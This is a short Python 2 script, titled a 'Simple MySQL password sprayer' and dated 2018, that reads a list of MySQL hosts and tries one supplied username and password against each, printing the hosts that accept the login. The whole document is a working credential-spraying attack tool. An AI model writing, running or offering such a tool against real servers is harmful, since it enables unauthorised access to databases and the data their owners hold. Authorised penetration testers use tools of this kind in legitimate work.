#!/usr/bin/env python
#Simple MySQL password sprayer
#Date: 03-18-2018
#Twitter: @0x616163
import sys
import argparse
import mysql.connector

def run(username,password,filename):
    hosts=open(filename, 'ro')
    if password == []:
        password = ""

    for host in hosts:
        try:
            c = mysql.connector.connect(user=username, password=password,host=host, database='mysql',connection_timeout=1)
            if c.is_connected() == True:
                print "[*] [" + host.strip('\n') + "] Status: " + "success!" + "\t " + str(username) + ":" + str(password)
            else:
                return 1
            c.close()
        except mysql.connector.errors.InterfaceError as e:
            print "[-] [" + host.strip('\n') + "] " + str(e[1])

def main():
    parser = argparse.ArgumentParser(add_help=True, description='MySQL Password Sprayer')
    parser.add_argument('-f', action="store", dest='filename', help='File containing a list of MySQL servers to test')
    parser.add_argument('-U', action="store", dest='username', help='MySQL username to test')
    parser.add_argument('-P', action="store", dest='password',nargs='*', help='MySQL password to test')
    results = parser.parse_args()
    args = vars(results)
    if len(sys.argv) < 2:
        parser.print_help()
        sys.exit(1)
    else:
        run(args['username'],args['password'],args['filename'])

main()
sys.exit(0)
